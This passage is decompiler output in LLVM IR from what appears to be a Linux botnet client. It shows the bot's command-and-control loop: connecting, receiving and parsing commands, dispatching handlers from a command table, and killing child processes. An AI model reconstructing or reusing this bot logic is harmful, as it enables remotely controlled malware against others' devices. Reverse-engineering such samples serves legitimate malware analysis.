dec_label_pc_8056bde:                             ; preds = %dec_label_pc_8056fec, %dec_label_pc_8056de2, %dec_label_pc_8056c2a, %dec_label_pc_8056b36
  %v0_8056bde = call i32 @con()
  %v0_8056be3 = load i32, i32* @global_var_807e1a4.36, align 4
  store i32 %v0_8056be3, i32* @ebx, align 4
  %v0_8056be9 = load i32, i32* @global_var_807e1d0.556, align 16
  store i32 %v0_8056be9, i32* @esi, align 4
  %v0_8056bef = load i32, i32* @global_var_807e1ac.53, align 4
  store i32 %v0_8056bef, i32* @edi, align 4
  %v0_8056bf5 = call i32 @getBuild()
  %v0_8056bfa = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 ptrtoint ([48 x i8]* @global_var_806d52c.559 to i32), i32* %stack_var_-6672, align 4
  %v2_8056c23 = call i32 @Send(i32 %v0_8056bfa, i32 ptrtoint ([48 x i8]* @global_var_806d52c.559 to i32))
  br label %dec_label_pc_8056c2a

dec_label_pc_8056c2a:                             ; preds = %dec_label_pc_8056dbd, %dec_label_pc_8056e16, %dec_label_pc_805700a, %dec_label_pc_805702b, %dec_label_pc_8056bde
  store i32 %v2_8056c34, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8056c3b = call i8* @_memset(i8* %tmp74, i32 0, i32 32)
  %v0_8056c43 = load i32, i32* @global_var_807e1b0.29, align 16
  %v2_8056c4a = udiv i32 %v0_8056c43, 32
  %v1_8056c52 = urem i32 %v0_8056c43, 32
  %v0_8056c55 = load i32, i32* @ebp, align 4
  %v2_8056c55 = mul nuw nsw i32 %v2_8056c4a, 4
  %v3_8056c55 = add nsw i32 %v2_8056c55, -452
  %v4_8056c55 = add i32 %v3_8056c55, %v0_8056c55
  %v5_8056c55 = inttoptr i32 %v4_8056c55 to i32*
  %v6_8056c55 = load i32, i32* %v5_8056c55, align 4
  %v9_8056c55 = shl i32 1, %v1_8056c52
  %v12_8056c55 = or i32 %v6_8056c55, %v9_8056c55
  store i32 %v12_8056c55, i32* %v5_8056c55, align 4
  store i32 1200, i32* %stack_var_-332, align 4
  %v0_8056c71 = load i32, i32* @global_var_807e1b0.29, align 16
  %v1_8056c76 = add i32 %v0_8056c71, 1
  store i32 %v1_8056c76, i32* %stack_var_-6672, align 4
  %v7_8056ca0 = call i32 @__libc_select(i32 %v1_8056c76, i32 %v2_8056c34, i32 0, i32 0, i32 %v4_8056c7f)
  %tmp76 = icmp slt i32 %v7_8056ca0, 1
  br i1 %tmp76, label %dec_label_pc_8056bde, label %dec_label_pc_8056daf.preheader

dec_label_pc_8056daf.preheader:                   ; preds = %dec_label_pc_8056c2a
  %v0_8056daf97 = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056db499 = icmp eq i32 %v0_8056daf97, 0
  br i1 %v10_8056db499, label %dec_label_pc_8056dbd, label %dec_label_pc_8056cb9

dec_label_pc_8056cb9:                             ; preds = %dec_label_pc_8056daf.preheader, %dec_label_pc_8056dac
  %storemerge9106 = phi i32 [ %.pre, %dec_label_pc_8056dac ], [ 0, %dec_label_pc_8056daf.preheader ]
  %v2_8056cbc = mul i32 %storemerge9106, 4
  %v0_8056cc1 = load i32, i32* @global_var_807f354.32, align 4
  %v2_8056cc6 = add i32 %v0_8056cc1, %v2_8056cbc
  %v1_8056cc9 = inttoptr i32 %v2_8056cc6 to i32*
  %v2_8056cc9 = load i32, i32* %v1_8056cc9, align 4
  store i32 %v2_8056cc9, i32* %stack_var_-6672, align 4
  %v5_8056cde = call i32 @waitpid(i32 %v2_8056cc9, i32 0, i32 1)
  %tmp77 = icmp slt i32 %v5_8056cde, 1
  %.pre = add i32 %storemerge9106, 1
  br i1 %tmp77, label %dec_label_pc_8056dac, label %dec_label_pc_8056ceb

dec_label_pc_8056ceb:                             ; preds = %dec_label_pc_8056cb9
  %v0_8056d1e80 = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056d2381 = icmp ult i32 %.pre, %v0_8056d1e80
  %v2_8056cf782 = mul i32 %.pre, 4
  %v0_8056cfc83 = load i32, i32* @global_var_807f354.32, align 4
  %v2_8056d0184 = add i32 %v0_8056cfc83, %v2_8056cf782
  %v1_8056d0485 = add i32 %v2_8056d0184, -4
  br i1 %v10_8056d2381, label %dec_label_pc_8056cf4, label %dec_label_pc_8056d28

dec_label_pc_8056cf4:                             ; preds = %dec_label_pc_8056ceb, %dec_label_pc_8056cf4
  %v1_8056d0489 = phi i32 [ %v1_8056d04, %dec_label_pc_8056cf4 ], [ %v1_8056d0485, %dec_label_pc_8056ceb ]
  %v2_8056d0188 = phi i32 [ %v2_8056d01, %dec_label_pc_8056cf4 ], [ %v2_8056d0184, %dec_label_pc_8056ceb ]
  %storemerge1186 = phi i32 [ %v4_8056d1b, %dec_label_pc_8056cf4 ], [ %.pre, %dec_label_pc_8056ceb ]
  store i32 %v1_8056d0489, i32* @ecx, align 4
  %v1_8056d17 = inttoptr i32 %v2_8056d0188 to i32*
  %v2_8056d17 = load i32, i32* %v1_8056d17, align 4
  %v2_8056d19 = inttoptr i32 %v1_8056d0489 to i32*
  store i32 %v2_8056d17, i32* %v2_8056d19, align 4
  %v4_8056d1b = add i32 %storemerge1186, 1
  %v0_8056d1e = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056d23 = icmp ult i32 %v4_8056d1b, %v0_8056d1e
  %v2_8056cf7 = mul i32 %v4_8056d1b, 4
  %v0_8056cfc = load i32, i32* @global_var_807f354.32, align 4
  %v2_8056d01 = add i32 %v0_8056cfc, %v2_8056cf7
  %v1_8056d04 = add i32 %v2_8056d01, -4
  br i1 %v10_8056d23, label %dec_label_pc_8056cf4, label %dec_label_pc_8056d28

dec_label_pc_8056d28:                             ; preds = %dec_label_pc_8056cf4, %dec_label_pc_8056ceb
  %v1_8056d04.lcssa = phi i32 [ %v1_8056d0485, %dec_label_pc_8056ceb ], [ %v1_8056d04, %dec_label_pc_8056cf4 ]
  %v1_8056d3b = inttoptr i32 %v1_8056d04.lcssa to i32*
  store i32 0, i32* %v1_8056d3b, align 4
  %v0_8056d41 = load i32, i32* @global_var_80756d4.31, align 4
  %v1_8056d46 = add i32 %v0_8056d41, -1
  store i32 %v1_8056d46, i32* @global_var_80756d4.31, align 4
  %v2_8056d51 = mul i32 %v1_8056d46, 4
  %v1_8056d54 = add i32 %v2_8056d51, 4
  store i32 %v1_8056d54, i32* %stack_var_-6672, align 4
  %v1_8056d5a = call i32 @malloc(i32 %v1_8056d54)
  %v0_8056d8d90 = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056d9292 = icmp eq i32 %v0_8056d8d90, 0
  br i1 %v10_8056d9292, label %dec_label_pc_8056d97, label %dec_label_pc_8056d6b

dec_label_pc_8056d6b:                             ; preds = %dec_label_pc_8056d28, %dec_label_pc_8056d6b
  %storemerge1093 = phi i32 [ %v4_8056d8a, %dec_label_pc_8056d6b ], [ 0, %dec_label_pc_8056d28 ]
  %v2_8056d6e = mul i32 %storemerge1093, 4
  %v5_8056d73 = add i32 %v2_8056d6e, %v1_8056d5a
  store i32 %v5_8056d73, i32* @ecx, align 4
  %v0_8056d7e = load i32, i32* @global_var_807f354.32, align 4
  %v2_8056d83 = add i32 %v0_8056d7e, %v2_8056d6e
  %v1_8056d86 = inttoptr i32 %v2_8056d83 to i32*
  %v2_8056d86 = load i32, i32* %v1_8056d86, align 4
  %v2_8056d88 = inttoptr i32 %v5_8056d73 to i32*
  store i32 %v2_8056d86, i32* %v2_8056d88, align 4
  %v4_8056d8a = add i32 %storemerge1093, 1
  %v0_8056d8d = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056d92 = icmp ult i32 %v4_8056d8a, %v0_8056d8d
  br i1 %v10_8056d92, label %dec_label_pc_8056d6b, label %dec_label_pc_8056d8d.dec_label_pc_8056d97_crit_edge

dec_label_pc_8056d8d.dec_label_pc_8056d97_crit_edge: ; preds = %dec_label_pc_8056d6b
  br label %dec_label_pc_8056d97

dec_label_pc_8056d97:                             ; preds = %dec_label_pc_8056d28, %dec_label_pc_8056d8d.dec_label_pc_8056d97_crit_edge
  %v0_8056d97 = load i32, i32* @global_var_807f354.32, align 4
  store i32 %v0_8056d97, i32* %stack_var_-6672, align 4
  %v1_8056d9f = call i32 @free(i32 %v0_8056d97)
  store i32 %v1_8056d5a, i32* @global_var_807f354.32, align 4
  br label %dec_label_pc_8056dac

dec_label_pc_8056dac:                             ; preds = %dec_label_pc_8056cb9, %dec_label_pc_8056d97
  %v0_8056daf = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8056db4 = icmp ult i32 %.pre, %v0_8056daf
  br i1 %v10_8056db4, label %dec_label_pc_8056cb9, label %dec_label_pc_8056dbd

dec_label_pc_8056dbd:                             ; preds = %dec_label_pc_8056daf.preheader, %dec_label_pc_8056dac
  %v0_8056dbd = load i32, i32* @global_var_807e1b0.29, align 16
  %v1_8056dc4 = urem i32 %v0_8056dbd, 32
  %v2_8056dcc = udiv i32 %v0_8056dbd, 32
  %v0_8056dcf = load i32, i32* @ebp, align 4
  %v2_8056dcf = mul nuw nsw i32 %v2_8056dcc, 4
  %v3_8056dcf = add nsw i32 %v2_8056dcf, -452
  %v4_8056dcf = add i32 %v3_8056dcf, %v0_8056dcf
  %v5_8056dcf = inttoptr i32 %v4_8056dcf to i32*
  %v6_8056dcf = load i32, i32* %v5_8056dcf, align 4
  %v9_8056dcf = shl i32 1, %v1_8056dc4
  %v10_8056dcf = and i32 %v6_8056dcf, %v9_8056dcf
  %v11_8056dcf = icmp ne i32 %v10_8056dcf, 0
  %v4_8056dda = icmp eq i1 %v11_8056dcf, false
  br i1 %v4_8056dda, label %dec_label_pc_8056c2a, label %dec_label_pc_8056de2

dec_label_pc_8056de2:                             ; preds = %dec_label_pc_8056dbd
  store i32 %v0_8056dbd, i32* %stack_var_-6672, align 4
  %v6_8056e04 = call i32 @recv(i32 %v0_8056dbd, i32 %v2_8056df7, i32 4096, i32 0)
  %tmp78 = icmp slt i32 %v6_8056e04, 1
  br i1 %tmp78, label %dec_label_pc_8056bde, label %dec_label_pc_8056e16

dec_label_pc_8056e16:                             ; preds = %dec_label_pc_8056de2
  %v0_8056e19 = load i32, i32* @ebp, align 4
  %v2_8056e19 = add i32 %v6_8056e04, -6596
  %v3_8056e19 = add i32 %v2_8056e19, %v0_8056e19
  %v4_8056e19 = inttoptr i32 %v3_8056e19 to i8*
  store i8 0, i8* %v4_8056e19, align 1
  store i32 %v2_8056df7, i32* @eax, align 4
  store i32 %v2_8056df7, i32* %stack_var_-6672, align 4
  %v3_8056e32 = call i32 @__GI_strtok(i32 %v2_8056df7, i32 ptrtoint (i32* @global_var_806d55c.560 to i32))
  %v5_8056e37 = inttoptr i32 %v3_8056e32 to i8*
  store i8* %v5_8056e37, i8** %stack_var_-32, align 4
  %v5_805702115 = icmp eq i32 %v3_8056e32, 0
  br i1 %v5_805702115, label %dec_label_pc_8056c2a, label %dec_label_pc_805702b

dec_label_pc_8056e3f:                             ; preds = %dec_label_pc_805702b
  store i32 %v4_805702b, i32* %stack_var_-6672, align 4
  %v2_8056e45 = call i32 @filter(i8* %v4_8056f1536)
  %v2_8056e4d = load i8, i8* %v4_8056f1536, align 1
  %v10_8056e50 = icmp eq i8 %v2_8056e4d, 58
  %v1_8056e52 = icmp eq i1 %v10_8056e50, false
  br i1 %v1_8056e52, label %dec_label_pc_8056ec9, label %dec_label_pc_8056e60.preheader

dec_label_pc_8056e60.preheader:                   ; preds = %dec_label_pc_8056e3f
  br label %dec_label_pc_8056e60

dec_label_pc_8056e5d:                             ; preds = %dec_label_pc_8056e85
  %v4_8056e5d = add i32 %storemerge8, 1
  br label %dec_label_pc_8056e60

dec_label_pc_8056e60:                             ; preds = %dec_label_pc_8056e60.preheader, %dec_label_pc_8056e5d
  %storemerge8 = phi i32 [ %v4_8056e5d, %dec_label_pc_8056e5d ], [ 0, %dec_label_pc_8056e60.preheader ]
  store i1 false, i1* @df, align 1
  %v3_8056e7a = call i32 @_strlen(i8* %v4_8056f1536)
  %v7_8056e81 = icmp ult i32 %storemerge8, %v3_8056e7a
  %v1_8056e83 = icmp eq i1 %v7_8056e81, false
  %.pre123 = add i32 %storemerge8, %v4_805702b
  br i1 %v1_8056e83, label %dec_label_pc_8056e60.dec_label_pc_8056e92_crit_edge, label %dec_label_pc_8056e85

dec_label_pc_8056e60.dec_label_pc_8056e92_crit_edge: ; preds = %dec_label_pc_8056e60
  %.pre124 = inttoptr i32 %.pre123 to i8*
  br label %dec_label_pc_8056e92

dec_label_pc_8056e85:                             ; preds = %dec_label_pc_8056e60
  %v1_8056e8b = inttoptr i32 %.pre123 to i8*
  %v2_8056e8b = load i8, i8* %v1_8056e8b, align 1
  %v7_8056e8e = icmp eq i8 %v2_8056e8b, 32
  %v1_8056e90 = icmp eq i1 %v7_8056e8e, false
  br i1 %v1_8056e90, label %dec_label_pc_8056e5d, label %dec_label_pc_8056e92

dec_label_pc_8056e92:                             ; preds = %dec_label_pc_8056e60.dec_label_pc_8056e92_crit_edge, %dec_label_pc_8056e85
  %v1_8056e98.pre-phi = phi i8* [ %.pre124, %dec_label_pc_8056e60.dec_label_pc_8056e92_crit_edge ], [ %v1_8056e8b, %dec_label_pc_8056e85 ]
  store i8 0, i8* %v1_8056e98.pre-phi, align 1
  %v3_8056e9b = load i8*, i8** %stack_var_-32, align 4
  %v4_8056e9b = ptrtoint i8* %v3_8056e9b to i32
  %v1_8056e9e = add i32 %v4_8056e9b, 1
  store i32 %v2_8056ec9, i32* @eax, align 4
  store i32 %v2_8056ec9, i32* %stack_var_-6672, align 4
  %v4_8056eac = call i32 @strcpy(i8* %v3_8056eac, i32 %v1_8056e9e)
  %v6_8056eb4 = add i32 %v4_8056e9b, %storemerge8
  %v1_8056eb7 = add i32 %v6_8056eb4, 1
  store i32 %v4_8056e9b, i32* @eax, align 4
  store i32 %v4_8056e9b, i32* %stack_var_-6672, align 4
  %v4_8056ec2 = call i32 @strcpy(i8* %v3_8056e9b, i32 %v1_8056eb7)
  br label %dec_label_pc_8056ee0.preheader

dec_label_pc_8056ec9:                             ; preds = %dec_label_pc_8056e3f
  store i32 42, i32* %stack_var_-2508, align 4
  br label %dec_label_pc_8056ee0.preheader

dec_label_pc_8056ee0.preheader:                   ; preds = %dec_label_pc_8056e92, %dec_label_pc_8056ec9
  %v4_8056f15 = phi i8* [ %v3_8056e9b, %dec_label_pc_8056e92 ], [ %v4_8056f1536, %dec_label_pc_8056ec9 ]
  %v4_8056ee3 = ptrtoint i8* %v4_8056f15 to i32
  br label %dec_label_pc_8056ee0

dec_label_pc_8056edd:                             ; preds = %dec_label_pc_8056f05
  %v4_8056edd = add i32 %storemerge7, 1
  br label %dec_label_pc_8056ee0

dec_label_pc_8056ee0:                             ; preds = %dec_label_pc_8056ee0.preheader, %dec_label_pc_8056edd
  %storemerge7 = phi i32 [ %v4_8056edd, %dec_label_pc_8056edd ], [ 0, %dec_label_pc_8056ee0.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v4_8056ee3, i32* @edi, align 4
  %v3_8056efa = call i32 @_strlen(i8* %v4_8056f15)
  %v7_8056f01 = icmp ult i32 %storemerge7, %v3_8056efa
  %v1_8056f03 = icmp eq i1 %v7_8056f01, false
  %.pre118 = add i32 %storemerge7, %v4_8056ee3
  br i1 %v1_8056f03, label %dec_label_pc_8056ee0.dec_label_pc_8056f12_crit_edge, label %dec_label_pc_8056f05

dec_label_pc_8056ee0.dec_label_pc_8056f12_crit_edge: ; preds = %dec_label_pc_8056ee0
  %.pre122 = inttoptr i32 %.pre118 to i8*
  br label %dec_label_pc_8056f12

dec_label_pc_8056f05:                             ; preds = %dec_label_pc_8056ee0
  %v1_8056f0b = inttoptr i32 %.pre118 to i8*
  %v2_8056f0b = load i8, i8* %v1_8056f0b, align 1
  %v7_8056f0e = icmp eq i8 %v2_8056f0b, 32
  %v1_8056f10 = icmp eq i1 %v7_8056f0e, false
  br i1 %v1_8056f10, label %dec_label_pc_8056edd, label %dec_label_pc_8056f12

dec_label_pc_8056f12:                             ; preds = %dec_label_pc_8056ee0.dec_label_pc_8056f12_crit_edge, %dec_label_pc_8056f05
  %v1_8056f18.pre-phi = phi i8* [ %.pre122, %dec_label_pc_8056ee0.dec_label_pc_8056f12_crit_edge ], [ %v1_8056f0b, %dec_label_pc_8056f05 ]
  store i8 0, i8* %v1_8056f18.pre-phi, align 1
  %v3_8056f1b = load i8*, i8** %stack_var_-32, align 4
  store i32 %v2_8056f22, i32* @eax, align 4
  store i32 %v2_8056f22, i32* %stack_var_-6672, align 4
  %v2_8056f2b = ptrtoint i8* %v3_8056f1b to i32
  %v4_8056f2b = call i32 @strcpy(i8* %v3_8056f2b, i32 %v2_8056f2b)
  %v6_8056f33 = add i32 %v2_8056f2b, %storemerge7
  %v1_8056f36 = add i32 %v6_8056f33, 1
  store i32 %v2_8056f2b, i32* @eax, align 4
  store i32 %v2_8056f2b, i32* %stack_var_-6672, align 4
  %v4_8056f41 = call i32 @strcpy(i8* %v3_8056f1b, i32 %v1_8056f36)
  %v4_8056f9b108 = load i32, i32* bitcast ([4 x i8]** @global_var_8070ee0.562 to i32*), align 8
  %v1_8056fa2109 = icmp eq i32 %v4_8056f9b108, 0
  %v1_8056fa4111 = icmp eq i1 %v1_8056fa2109, false
  br i1 %v1_8056fa4111, label %dec_label_pc_8056f4f, label %dec_label_pc_8056fa6

dec_label_pc_8056f4f:                             ; preds = %dec_label_pc_8056f12, %dec_label_pc_8056f4f
  %v3_8056f9b114 = phi i32* [ %v3_8056f9b, %dec_label_pc_8056f4f ], [ bitcast ([4 x i8]** @global_var_8070ee0.562 to i32*), %dec_label_pc_8056f12 ]
  %v1_8056f9b113 = phi i32 [ %v1_8056f9b, %dec_label_pc_8056f4f ], [ 0, %dec_label_pc_8056f12 ]
  %storemerge112 = phi i32 [ %v4_8056f95, %dec_label_pc_8056f4f ], [ 0, %dec_label_pc_8056f12 ]
  %v4_8056f52 = load i32, i32* %v3_8056f9b114, align 8
  store i32 %v4_8056f52, i32* %stack_var_-6672, align 4
  %v3_8056f66 = inttoptr i32 %v4_8056f52 to i8*
  %v4_8056f66 = call i32 @__GI_strcasecmp(i8* %v3_8056f66, i32 %v2_8056f22)
  %v2_8056f72 = add i32 %v1_8056f9b113, ptrtoint (i32* @global_var_8070ee4.563 to i32)
  %v3_8056f72 = inttoptr i32 %v2_8056f72 to i32*
  %v4_8056f72 = load i32, i32* %v3_8056f72, align 4
  %v0_8056f79 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_8056f79, i32* %stack_var_-6672, align 4
  call void @__pseudo_call(i32 %v4_8056f72)
  %v4_8056f95 = add i32 %storemerge112, 1
  %v1_8056f9b = mul i32 %v4_8056f95, 8
  %v2_8056f9b = add i32 %v1_8056f9b, ptrtoint ([4 x i8]** @global_var_8070ee0.562 to i32)
  %v3_8056f9b = inttoptr i32 %v2_8056f9b to i32*
  %v4_8056f9b = load i32, i32* %v3_8056f9b, align 8
  %v1_8056fa2 = icmp eq i32 %v4_8056f9b, 0
  %v1_8056fa4 = icmp eq i1 %v1_8056fa2, false
  br i1 %v1_8056fa4, label %dec_label_pc_8056f4f, label %dec_label_pc_8056fa6

dec_label_pc_8056fa6:                             ; preds = %dec_label_pc_8056f4f, %dec_label_pc_8056f12
  store i32 %v2_8056f22, i32* %stack_var_-6672, align 4
  %v4_8056fb7 = call i32 @__GI_strcasecmp(i8* %v3_8056f2b, i32 ptrtoint ([6 x i8]* @global_var_806d55e.564 to i32))
  store i32 %v4_8056fb7, i32* @eax, align 4
  %v1_8056fbc = icmp eq i32 %v4_8056fb7, 0
  %v1_8056fbe = icmp eq i1 %v1_8056fbc, false
  br i1 %v1_8056fbe, label %dec_label_pc_805700a, label %dec_label_pc_8056fc0

dec_label_pc_8056fc0:                             ; preds = %dec_label_pc_8056fa6
  %v0_8056fc0 = load i32, i32* @global_var_80756c0.301, align 64
  %v1_8056fc5 = icmp eq i32 %v0_8056fc0, 0
  br i1 %v1_8056fc5, label %dec_label_pc_8056fec, label %dec_label_pc_8056fc9

dec_label_pc_8056fc9:                             ; preds = %dec_label_pc_8056fc0
  store i32 %v0_8056fc0, i32* %stack_var_-6672, align 4
  %v3_8056fd9 = call i32 @kill(i32 %v0_8056fc0, i32 9)
  %v1_8056fde = icmp eq i32 %v3_8056fd9, 0
  %v1_8056fe0 = icmp eq i1 %v1_8056fde, false
  br i1 %v1_8056fe0, label %dec_label_pc_8056fec, label %dec_label_pc_8056fe2

dec_label_pc_8056fe2:                             ; preds = %dec_label_pc_8056fc9
  store i32 0, i32* @global_var_80756c0.301, align 64
  br label %dec_label_pc_8056fec

dec_label_pc_8056fec:                             ; preds = %dec_label_pc_8056fc9, %dec_label_pc_8056fc0, %dec_label_pc_8056fe2
  %v0_8056fec = load i32, i32* @global_var_807e1b0.29, align 16
  %v1_8056ff4 = call i32 @close(i32 %v0_8056fec)
  %v1_8057000 = call i32 @sleep(i32 5)
  br label %dec_label_pc_8056bde

dec_label_pc_805700a:                             ; preds = %dec_label_pc_8056fa6
  store i32 0, i32* %stack_var_-6672, align 4
  %v3_8057019 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806d55c.560 to i32))
  store i32 %v3_8057019, i32* %tmp75, align 4
  %v5_8057021 = icmp eq i32 %v3_8057019, 0
  %tmp79 = inttoptr i32 %v3_8057019 to i8*
  br i1 %v5_8057021, label %dec_label_pc_8056c2a, label %dec_label_pc_805702b

dec_label_pc_805702b:                             ; preds = %dec_label_pc_8056e16, %dec_label_pc_805700a
  %v4_8056f1536 = phi i8* [ %tmp79, %dec_label_pc_805700a ], [ %v5_8056e37, %dec_label_pc_8056e16 ]
  %v4_805702b = ptrtoint i8* %v4_8056f1536 to i32
  %v2_805702e = load i8, i8* %v4_8056f1536, align 1
  %v4_8057031 = icmp eq i8 %v2_805702e, 0
  %v1_8057033 = icmp eq i1 %v4_8057031, false
  br i1 %v1_8057033, label %dec_label_pc_8056e3f, label %dec_label_pc_8056c2a

dec_label_pc_805703e:                             ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_805702b, { 1, 0 }
  uselistorder i8* %v4_8056f1536, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8056fc0, { 1, 0, 2 }
  uselistorder i32* %v3_8056f9b, { 1, 0 }
  uselistorder i32 %v1_8056f9b, { 1, 0 }
  uselistorder i32 %v4_8056f95, { 1, 0 }
  uselistorder i32 %v2_8056f2b, { 2, 1, 0, 3 }
  uselistorder i32 %storemerge7, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8056e9b, { 2, 1, 0, 3 }
  uselistorder i32 %storemerge8, { 2, 1, 0, 3 }
  uselistorder i32 %v6_8056e04, { 1, 0 }
  uselistorder i32 %v0_8056dbd, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8056d8a, { 1, 0 }
  uselistorder i32 %v2_8056d6e, { 1, 0 }
  uselistorder i32 %storemerge1093, { 1, 0 }
  uselistorder i32 %v1_8056d5a, { 1, 0 }
  uselistorder i32 %v2_8056d01, { 1, 0 }
  uselistorder i32 %v4_8056d1b, { 0, 2, 1 }
  uselistorder i32 %v1_8056d0489, { 1, 0 }
  uselistorder i32 %.pre, { 3, 1, 0, 4, 2 }
  uselistorder i32 %storemerge9106, { 1, 0 }
  uselistorder i32 %v1_8056c76, { 1, 0 }
  uselistorder i32 %v0_8056c43, { 1, 0 }
  uselistorder i32 %v2_8056ec9, { 1, 0 }
  uselistorder i32 %v2_8056df7, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge12, { 2, 0, 1 }
  uselistorder i32 %v2_8056acc, { 1, 0 }
  uselistorder i32 %v2_8056a3a, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-6672, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0, 1, 27, 28, 29, 2, 30 }
  uselistorder i32* %stack_var_-2508, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder [4 x i8]** @global_var_8070ee0.562, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 20, 19, 1, 18, 0, 14, 5, 13, 4, 12, 3, 11, 2, 17, 16, 15, 10, 7, 9, 6, 8 }
  uselistorder i32* @global_var_807f354.32, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* @global_var_80756d4.31, { 6, 7, 1, 8, 9, 10, 2, 0, 11, 3, 12, 4, 13, 14, 15, 5, 16, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @Send, { 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 83, 82, 81, 80, 79, 162, 161, 160, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62 }
  uselistorder i32* @global_var_807e0a0.63, { 1, 0 }
  uselistorder label %dec_label_pc_805702b, { 1, 0 }
  uselistorder label %dec_label_pc_8056fec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056f4f, { 1, 0 }
  uselistorder label %dec_label_pc_8056f12, { 1, 0 }
  uselistorder label %dec_label_pc_8056ee0, { 1, 0 }
  uselistorder label %dec_label_pc_8056ee0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056e92, { 1, 0 }
  uselistorder label %dec_label_pc_8056e60, { 1, 0 }
  uselistorder label %dec_label_pc_8056dbd, { 1, 0 }
  uselistorder label %dec_label_pc_8056dac, { 1, 0 }
  uselistorder label %dec_label_pc_8056d97, { 1, 0 }
  uselistorder label %dec_label_pc_8056d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8056cf4, { 1, 0 }
  uselistorder label %dec_label_pc_8056cb9, { 1, 0 }
  uselistorder label %dec_label_pc_8056c2a, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8056b29, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_8057050 = load i32, i32* @esp, align 4
  %v1_8057050 = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_8057050 = icmp ult i32 %v0_8057050, %v1_8057050
  %v1_8057056 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8057056, i32* @edx, align 4
  %v1_805705d = icmp eq i1 %v7_8057050, false
  br i1 %v1_805705d, label %dec_label_pc_805708e, label %dec_label_pc_805705f

dec_label_pc_805705f:                             ; preds = %entry
  %v1_805705f = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805705f = icmp ult i32 %v0_8057050, %v1_805705f
  br i1 %v7_805705f, label %dec_label_pc_8057074, label %dec_label_pc_8057067

dec_label_pc_8057067:                             ; preds = %dec_label_pc_805705f
  %v1_8057067 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_8057067 = icmp ult i32 %v0_8057050, %v1_8057067
  br i1 %v7_8057067, label %dec_label_pc_805708e, label %dec_label_pc_8057074

dec_label_pc_8057074:                             ; preds = %dec_label_pc_8057067, %dec_label_pc_805705f
  %v0_8057074 = load i32, i32* @global_var_807f358.569, align 8
  %v1_8057074 = icmp eq i32 %v0_8057074, 0
  br i1 %v1_8057074, label %dec_label_pc_8057082, label %dec_label_pc_805707d

